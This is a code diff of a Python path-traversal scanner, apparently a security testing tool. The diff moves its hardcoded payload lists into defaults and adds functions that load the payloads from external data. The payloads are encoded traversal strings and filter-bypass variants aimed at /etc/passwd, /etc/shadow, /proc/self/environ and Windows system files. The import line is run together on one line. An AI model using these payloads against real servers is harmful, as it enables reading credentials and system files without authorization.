@@ -19,7 +19,7 @@ Fluxo:
 """
 import argparseimport asyncioimport loggingfrom collections.abc import Awaitablefrom dataclasses import asdict, dataclassfrom urllib.parse import urlparse, urlunparseimport httpxfrom mytools.core.utils import (    Cyber,    add_common_args,    color,    create_async_client,    create_banner,    init_scanner,    print_exploit_info,    run_main_loop,    safe_asyncio_run,    write_output,)logger = logging.getLogger("mytools.pathtraversal")
 
-_CATEGORY_MAP: dict[str, list[str]] = {
+_CATEGORY_MAP_DEFAULT: dict[str, list[str]] = {
     "path": ["url_encoded", "double_encoded", "overlong_utf8", "overlong_3byte"],
     "param": ["param_traversal", "param_encoded", "param_json"],
     "semicolon": ["semicolon_bypass", "semicolon_encoded", "semicolon_double"],
@@ -27,7 +27,7 @@ _CATEGORY_MAP: dict[str, list[str]] = {
     "platform": ["linux_passwd", "linux_proc", "windows_system"],
 }
 
-_TRAVERSAL_PAYLOADS: list[tuple[str, str]] = [
+_TRAVERSAL_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
     ("url_encoded", "..%2f..%2f..%2fetc/passwd"),
     ("url_encoded", "..%2f..%2f..%2fproc/self/environ"),
     ("double_encoded", "..%252f..%252f..%252fetc/passwd"),
@@ -37,19 +37,19 @@ _TRAVERSAL_PAYLOADS: list[tuple[str, str]] = [
     ("overlong_3byte", "..%e0%80%af..%e0%80%afetc/passwd"),
 ]
 
-_SEMICOLON_PAYLOADS: list[tuple[str, str]] = [
+_SEMICOLON_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
     ("semicolon_bypass", "..;/..;/..;/etc/passwd"),
     ("semicolon_encoded", "..%3b..%3b..%3betc/passwd"),
     ("semicolon_double", "..%253b..%253b..%253betc/passwd"),
 ]
 
-_MIXED_PAYLOADS: list[tuple[str, str]] = [
+_MIXED_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
     ("mixed_encoding", "..%c0%af..%252fetc/passwd"),
     ("mixed_backslash", "..%5c..%2fetc/passwd"),
     ("tab_injection", "..%09..%09..%09etc/passwd"),
 ]
 
-_PLATFORM_PAYLOADS: list[tuple[str, str]] = [
+_PLATFORM_PAYLOADS_DEFAULT: list[tuple[str, str]] = [
     ("linux_passwd", "..%2f..%2f..%2fetc/passwd"),
     ("linux_passwd", "..%2f..%2f..%2fetc/shadow"),
     ("linux_proc", "..%2f..%2f..%2fproc/self/environ"),
@@ -58,9 +58,45 @@ _PLATFORM_PAYLOADS: list[tuple[str, str]] = [
     ("windows_system", "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts"),
 ]
 
-
-@dataclass(frozen=True, slots=True)
-class PathTraversalAttempt:
+def _load_category_map():
+    from mytools.data import load_payloads
+    data = load_payloads("web", "pathtraversal", default={"category_map": _CATEGORY_MAP_DEFAULT})
+    return data.get("category_map", _CATEGORY_MAP_DEFAULT)
+
+def _load_traversal_payloads():
+    from mytools.data import load_payloads
+    data = load_payloads("web", "pathtraversal", default={"traversal_payloads": _TRAVERSAL_PAYLOADS_DEFAULT})
+    raw = data.get("traversal_payloads", _TRAVERSAL_PAYLOADS_DEFAULT)
+    return [tuple(item) for item in raw]
+
+def _load_semicolon_payloads():
+    from mytools.data import load_payloads
+    data = load_payloads("web", "pathtraversal", default={"semicolon_payloads": _SEMICOLON_PAYLOADS_DEFAULT})
+    raw = data.get("semicolon_payloads", _SEMICOLON_PAYLOADS_DEFAULT)
+    return [tuple(item) for item in raw]
+
+def _load_mixed_payloads():
+    from mytools.data import load_payloads
+    data = load_payloads("web", "pathtraversal", default={"mixed_payloads": _MIXED_PAYLOADS_DEFAULT})
+    raw = data.get("mixed_payloads", _MIXED_PAYLOADS_DEFAULT)
+    return [tuple(item) for item in raw]
+
+def _load_platform_payloads():
+    from mytools.data import load_payloads
+    data = load_payloads("web", "pathtraversal", default={"platform_payloads": _PLATFORM_PAYLOADS_DEFAULT})
+    raw = data.get("platform_payloads", _PLATFORM_PAYLOADS_DEFAULT)
+    return [tuple(item) for item in raw]
+
+_CATEGORY_MAP = _load_category_map()
+_TRAVERSAL_PAYLOADS = _load_traversal_payloads()
+_SEMICOLON_PAYLOADS = _load_semicolon_payloads()
+_MIXED_PAYLOADS = _load_mixed_payloads()
+_PLATFORM_PAYLOADS = _load_platform_payloads()
+
+
+@dataclass(frozen=True, slots=True)
+
+class PathTraversalAttempt:
     """Tentativa individual de path traversal via encoding."""
 
     technique: str
